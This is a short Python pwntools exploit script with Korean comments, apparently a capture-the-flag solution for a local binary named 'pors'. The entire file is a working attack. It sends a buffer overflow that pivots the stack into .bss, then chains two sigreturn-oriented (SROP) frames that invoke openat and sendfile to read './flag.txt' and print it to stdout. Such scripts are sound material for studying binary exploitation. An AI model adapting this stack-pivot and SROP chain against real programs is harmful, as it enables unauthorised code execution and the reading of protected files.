#!/usr/bin/python3

from pwn import *

p = process("./pors")
e = ELF("./pors")

syscall = e.plt['syscall']
read_ = 0x40131c # main 함수 내부 syscall 함수 시작주소
pop_rdi = 0x4012ec
bss = e.bss()
ret = 0x4012ed

payload = b'A'* 0x20
payload += p64(bss+0x20) # SBP
payload += p64(read_) # bss + 0x28부터 rsp 시작 (stack pivot)

p.send(payload)

context.arch="amd64"
openat_frame = SigreturnFrame()
openat_frame.rdi = 0x101 #rax
openat_frame.rsi = -100 # rdi
openat_frame.rdx = bss # rsi
openat_frame.rcx = 0 # 0_RDONLY flag
openat_frame.rip = syscall
openat_frame.rsp = bss + 0x138 # frame(0x98) + flag+dummy(0x28) + pop_rdi+0xf+syscall(0x18) = 0x138

sendfile_frame = SigreturnFrame()
sendfile_frame.rdi = 0x28
sendfile_frame.rsi = 1 # stdout
sendfile_frame.rdx = 3 # fd
sendfile_frame.rcx = 0
sendfile_frame.r8 = 0x100
sendfile_frame.rip = syscall
sendfile_frame.rsp = bss+0x500

payload = b"./flag.txt\x00\x00\x00\x00\x00\x00" # 16byte
payload += b'A'*0x18
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(openat_frame)
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(sendfile_frame)
payload += p64(ret)

pause()
p.send(payload)
pause()

p.interactive()



